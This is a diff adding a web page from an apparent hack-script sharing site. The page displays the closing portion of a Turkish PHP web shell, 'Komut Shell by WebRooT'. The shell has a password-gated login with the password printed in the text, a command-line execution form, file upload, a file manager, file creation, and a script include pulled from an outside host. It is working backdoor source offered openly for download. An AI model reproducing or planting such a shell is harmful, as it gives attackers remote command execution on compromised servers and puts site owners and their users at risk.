+<span class="lineno">420</span>             <span class="k">print</span> <span class="s1">&#39;&amp;nbsp;&lt;input type=&quot;button&quot; value=&quot;&#39;</span> <span class="o">.</span> <span class="nv">$name</span> <span class="o">.</span> <span class="s1">&#39;&quot; onclick=&quot;&#39;</span> <span class="o">.</span> <span class="nv">$execute</span> <span class="o">.</span> <span class="s1">&#39;&quot;&gt;&lt;br&gt;&#39;</span><span class="p">;</span>
+<span class="lineno">421</span>         <span class="p">}</span>
+<span class="lineno">422</span> <span class="cp">?&gt;</span><span class="x"></span>
+<span class="lineno">423</span> 
+<span class="lineno">424</span> <span class="x">&lt;/center&gt;</span>
+<span class="lineno">425</span> 
+<span class="lineno">426</span> <span class="x">&lt;/div&gt;</span>
+<span class="lineno">427</span> <span class="x">&lt;/form&gt;</span>
+<span class="lineno">428</span> <span class="x">&lt;center&gt;&lt;b&gt;Komut Gecmisi&lt;/b&gt;&lt;br&gt;&lt;/center&gt;</span>
+<span class="lineno">429</span> <span class="x">&lt;div id=&quot;history&quot; style=&#39;margin: 0px;padding: 0px;border: 1px inset;width: 100%;height: 20%;text-align: left;overflow: auto;font-size: 10px;&#39;&gt;&lt;/div&gt;</span>
+<span class="lineno">430</span> <span class="x">&lt;br&gt;</span>
+<span class="lineno">431</span> <span class="x">&lt;center&gt;&lt;b&gt;Hakkinda&lt;/b&gt;&lt;br&gt;&lt;/center&gt;</span>
+<span class="lineno">432</span> <span class="x">&lt;div style=&#39;margin: 0px;padding: 0px;border: 1px inset;width: 100%;text-align: center;overflow: auto; font-size: 10px;&#39;&gt;</span>
+<span class="lineno">433</span> <span class="x">&lt;br&gt;</span>
+<span class="lineno">434</span> <span class="x">&lt;b&gt;&lt;font size=3&gt;Komut Shell&lt;/b&gt;&lt;/font&gt;&lt;br&gt;by WebRooT</span>
+<span class="lineno">435</span> <span class="x">&lt;br&gt;</span>
+<span class="lineno">436</span> <span class="x">Version </span><span class="cp">&lt;?php</span> <span class="k">print</span> <span class="nv">$version</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
+<span class="lineno">437</span> <span class="x">&lt;/div&gt;</span>
+<span class="lineno">438</span> <span class="x">&lt;SCRIPT SRC=http://www.r57.gen.tr/yazciz/ciz.js&gt;&lt;/SCRIPT&gt;</span>
+<span class="lineno">439</span> <span class="x">&lt;/td&gt;</span>
+<span class="lineno">440</span> <span class="x">&lt;td width=70%&gt;</span>
+<span class="lineno">441</span> <span class="x">&lt;table border=0 width=100% height=100%&gt;&lt;td id=&quot;tabs&quot; height=1%&gt;&lt;font size=0&gt;</span>
+<span class="lineno">442</span> <span class="x">&lt;b style=&quot;cursor:crosshair&quot; onclick=&quot;set_tab(&#39;cmd&#39;);&quot;&gt;[Komut alistir]&lt;/b&gt;</span>
+<span class="lineno">443</span> <span class="x">&lt;b style=&quot;cursor:crosshair&quot; onclick=&quot;set_tab(&#39;upload&#39;);&quot;&gt;[Dosya Upload]&lt;/b&gt;</span>
+<span class="lineno">444</span> <span class="x">&lt;b style=&quot;cursor:crosshair&quot; onclick=&quot;set_tab(&#39;workingdir&#39;);&quot;&gt;[Dizin Degistir]&lt;/b&gt;</span>
+<span class="lineno">445</span> <span class="x">&lt;b style=&quot;cursor:crosshair&quot; onclick=&quot;set_tab(&#39;filebrowser&#39;);&quot;&gt;[Dosya Yoneticisi]&lt;/b&gt;</span>
+<span class="lineno">446</span> <span class="x">&lt;b style=&quot;cursor:crosshair&quot; onclick=&quot;set_tab(&#39;createfile&#39;);&quot;&gt;[Dosya Olustur]&lt;/b&gt;</span>
+<span class="lineno">447</span> 
+<span class="lineno">448</span> <span class="x">&lt;/font&gt;&lt;/td&gt;</span>
+<span class="lineno">449</span> <span class="x">&lt;tr&gt;</span>
+<span class="lineno">450</span> <span class="x">&lt;td height=99% width=100% valign=top&gt;&lt;div id=&quot;output&quot; style=&#39;height:100%;white-space:pre;overflow:auto&#39;&gt;&lt;/div&gt;</span>
+<span class="lineno">451</span> 
+<span class="lineno">452</span> <span class="x">&lt;tr&gt;</span>
+<span class="lineno">453</span> <span class="x">&lt;td  height=1% width=100% valign=top&gt;</span>
+<span class="lineno">454</span> <span class="x">&lt;div id=&quot;commandtab&quot; style=&#39;height:100%;white-space:pre;overflow:auto&#39;&gt;</span>
+<span class="lineno">455</span> <span class="x">&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;form name=&quot;cmdform&quot; onsubmit=&quot;return runcommand(document.cmdform.command.value,&#39;GET&#39;);&quot;&gt;</span>
+<span class="lineno">456</span> <span class="x">&lt;b&gt;Komut Satiri&lt;/b&gt;: &lt;input type=text name=command class=cmdthing size=100%&gt;&lt;br&gt;</span>
+<span class="lineno">457</span> <span class="x">&lt;/form&gt;</span>
+<span class="lineno">458</span> <span class="x">&lt;/div&gt;</span>
+<span class="lineno">459</span> <span class="x">&lt;/td&gt;</span>
+<span class="lineno">460</span> <span class="x">&lt;/table&gt;</span>
+<span class="lineno">461</span> <span class="x">&lt;/td&gt;</span>
+<span class="lineno">462</span> <span class="x">&lt;/table&gt;</span>
+<span class="lineno">463</span> <span class="x">&lt;/body&gt;</span>
+<span class="lineno">464</span> <span class="x">&lt;/html&gt;</span>
+<span class="lineno">465</span> <span class="cp">&lt;?php</span>
+<span class="lineno">466</span>     <span class="p">}</span>
+<span class="lineno">467</span> <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+<span class="lineno">468</span>     <span class="k">print</span> <span class="s2">&quot;&lt;center&gt;&lt;table border=0  height=100%&gt;</span>
+<span class="lineno">469</span> <span class="s2">&lt;td valign=middle&gt;</span>
+<span class="lineno">470</span> <span class="s2">&lt;form action=&quot;</span> <span class="o">.</span> <span class="nb">basename</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot; method=POST&gt;Ltfen giris yapiniz. (sifre=webr00t)&lt;br&gt;&lt;b&gt;Password:&lt;/b&gt;&lt;input type=password name=p4ssw0rD&gt;&lt;input type=submit value=</span><span class="se">\&quot;</span><span class="s2">Log in</span><span class="se">\&quot;</span><span class="s2">&gt;</span>
+<span class="lineno">471</span> <span class="s2">&lt;/form&gt;&quot;</span><span class="p">;</span>
+<span class="lineno">472</span> <span class="p">}</span>
+<span class="lineno">473</span> <span class="cp">?&gt;</span><span class="x"></span></code></pre></div>
+
+
+
+        </section>
+
+        <aside id="sidebar">
+          <a href="http://upload.hackingscripts.com" class="button">
+            <small>Upload</small>
+            a file
+          </a>
+
+
+          <a href="/scripts/" class="button">
+            <small>The entire list of</small>
+            hack scripts
+          </a>
+
+          <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+            <!-- HS1 -->
+            <ins class="adsbygoogle"
+                 style="display:inline-block;width:160px;height:600px"
+                 data-ad-client="ca-pub-7125626766070078"
+                 data-ad-slot="3438552774"></ins>
+            <script>
+            (adsbygoogle = window.adsbygoogle || []).push({});
+            </script>
+          <!--
+          <p class="repo-owner"><a href="https://github.com/jasonlong/architect-theme">architect-theme</a> is maintained by <a href="https://github.com/jasonlong">jasonlong</a>.</p>
+
+          <p class="repo-owner"><a href="https://github.com/pietromenna/jekyll-architect-theme">jekyll-architect-theme</a> is maintained by <a href="https://github.com/pietromenna">pietromenna</a>.</p>
+
+          <p>This page was generated by <a href="https://pages.github.com">GitHub Pages</a> using the Architect theme by <a href="https://twitter.com/jasonlong">Jason Long</a>.</p>
+      -->
+        </aside>
+
+      </div>
+    </div>
+
+  </body>
+</html>
